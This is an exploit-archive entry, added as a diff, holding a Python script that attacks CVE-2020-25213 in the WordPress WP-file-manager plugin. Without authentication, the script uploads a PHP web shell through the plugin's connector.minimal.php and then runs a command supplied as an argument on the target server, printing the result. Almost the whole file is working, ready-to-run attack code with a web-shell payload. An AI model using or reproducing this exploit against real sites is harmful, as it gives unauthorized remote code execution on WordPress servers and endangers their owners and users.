@@ -1,0 +1,81 @@
+id: 38454
+date: 04/03/2023
+title: WordPress WP-file-manager v6.9 Plugin - Unauthenticated Arbitrary File Upload Exploit
+author: BLY
+cves: CVE-2020-25213
+
+#!/usr/bin/env
+
+# Exploit Title: WP-file-manager v6.9 - Unauthenticated Arbitrary File Upload leading to RCE
+# Date: [ 22-01-2023 ]
+# Exploit Author: [BLY]
+# Vendor Homepage: [https://wpscan.com/vulnerability/10389]
+# Version: [ File Manager plugin 6.0-6.9]
+# Tested on: [ Debian ]
+# CVE : [ CVE-2020-25213 ]
+
+import sys,signal,time,requests
+from bs4 import BeautifulSoup
+#from pprint import pprint
+
+def handler(sig,frame):
+	print ("[!]Saliendo")
+	sys.exit(1)
+
+signal.signal(signal.SIGINT,handler)
+
+def commandexec(command):
+
+	exec_url = url+"/wp-content/plugins/wp-file-manager/lib/php/../files/shell.php"
+	params = {
+		"cmd":command
+	}
+
+	r=requests.get(exec_url,params=params)
+
+	soup = BeautifulSoup(r.text, 'html.parser')
+	text = soup.get_text()
+
+	print (text)
+def exploit():
+
+	global url
+
+	url = sys.argv[1]
+	command = sys.argv[2]
+	upload_url = url+"/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php"
+
+	headers = {
+			'content-type': "multipart/form-data; boundary=----WebKitFormBoundaryvToPIGAB0m9SB1Ww",
+			'Connection': "close" 
+	}
+
+	payload = "------WebKitFormBoundaryvToPIGAB0m9SB1Ww\r\nContent-Disposition: form-data; name=\"cmd\"\r\n\r\nupload\r\n------WebKitFormBoundaryvToPIGAB0m9SB1Ww\r\nContent-Disposition: form-data; name=\"target\"\r\n\r\nl1_Lw\r\n------WebKitFormBoundaryvToPIGAB0m9SB1Ww\r\nContent-Disposition: form-data; name=\"upload[]\"; filename=\"shell.php\"\r\nContent-Type: application/x-php\r\n\r\n<?php echo \"<pre>\" . shell_exec($_REQUEST['cmd']) . \"</pre>\"; ?>\r\n------WebKitFormBoundaryvToPIGAB0m9SB1Ww--"
+
+	try:
+		r=requests.post(upload_url,data=payload,headers=headers)
+		#pprint(r.json())
+		commandexec(command)
+	except:
+		print("[!] Algo ha salido mal...")
+
+
+
+
+def help():
+
+	print ("\n[*] Uso: python3",sys.argv[0],"\"url\" \"comando\"")
+	print ("[!] Ejemplo: python3",sys.argv[0],"http://wordpress.local/ id")
+
+
+
+
+if __name__ == '__main__':
+
+	if len(sys.argv) != 3:
+		help()
+
+	else:
+		exploit()
+
+#  0day.today [2023-04-19]  #
